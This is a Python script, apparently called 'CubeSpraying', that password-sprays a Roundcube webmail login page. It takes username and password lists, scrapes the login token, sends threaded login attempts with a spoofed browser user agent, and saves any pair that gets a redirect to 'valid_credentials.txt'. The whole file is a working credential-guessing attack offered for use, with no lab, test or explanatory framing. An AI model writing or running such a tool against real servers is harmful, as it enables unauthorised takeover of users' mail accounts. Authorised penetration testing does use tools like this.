import argparse
import requests
import re
import os
import threading
import time

parser = argparse.ArgumentParser(description='CubeSpraying')
parser.add_argument('--url', '-u', type=str, required=True, help='URL of the Roundcube application')
parser.add_argument('--usernames', '-U', type=str, required=True, help='Single username or dile containing usernames')
parser.add_argument('--passwords', '-P', type=str, required=True, help='Single password or file containing passwords')
parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose output')
parser.add_argument('--timeout', '-t', type=float, default=0.5, help='Time to wait between each request in seconds')
args = parser.parse_args()

def read_list_from_file_or_single_value(value):
    if os.path.isfile(value):
        with open(value, 'r') as f:
            return f.read().splitlines()
    return [value]

def get_login_token(session, url):
    response = session.get(url)
    if response.status_code == 200:
        token_match = re.search(r'<input type="hidden" name="_token" value="([^"]+)"', response.text)
        if token_match:
            return token_match.group(1)
    return None

def try_login(url, username, password):
    session = requests.Session() 
    login_page_url = f'{url}/?_task=login'
    
    token = get_login_token(session, login_page_url)
    if not token:
        if args.verbose:
            print(f"[-] Failed to retrieve login token for {username}.")
        return
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        }
        login_data = {
            '_token': token,
            '_user': username,
            '_pass': password,
            '_task': 'login',
            '_action': 'login',
            '_timezone': 'Europe/Moscow',
            '_url': ''
        }

        response = session.post(login_page_url, data=login_data, headers=headers, allow_redirects=False, timeout=15)
        status_code = response.status_code
        
        if args.verbose:
            print(f"Trying {username}:{password} - HTTP Status Code: {status_code}")
        
        if status_code == 302:
            success_message = f"[SUCCESS] Valid credentials found: {username}:{password}"
            print("*" * len(success_message))
            print(success_message)
            print("*" * len(success_message))

            with open('valid_credentials.txt', 'a') as f:
                f.write(f"{username}:{password}\n")
    except requests.exceptions.ReadTimeout:
        if args.verbose:
            print(f"Timeout while trying to log in for {username}.")
    except requests.exceptions.RequestException as e:
        if args.verbose:
            print(f"Error sending request for {username}: {e}")
    finally:
        session.close()  

def password_spraying(url, usernames, passwords, timeout):
    threads = []
    for password in passwords:
        for username in usernames:
            t = threading.Thread(target=try_login, args=(url, username, password))
            threads.append(t)
            t.start()
            time.sleep(timeout)  

        for t in threads:
            t.join()
        threads = [] 

if __name__ == "__main__":
    usernames = read_list_from_file_or_single_value(args.usernames)
    passwords = read_list_from_file_or_single_value(args.passwords)
    password_spraying(args.url, usernames, passwords, args.timeout)
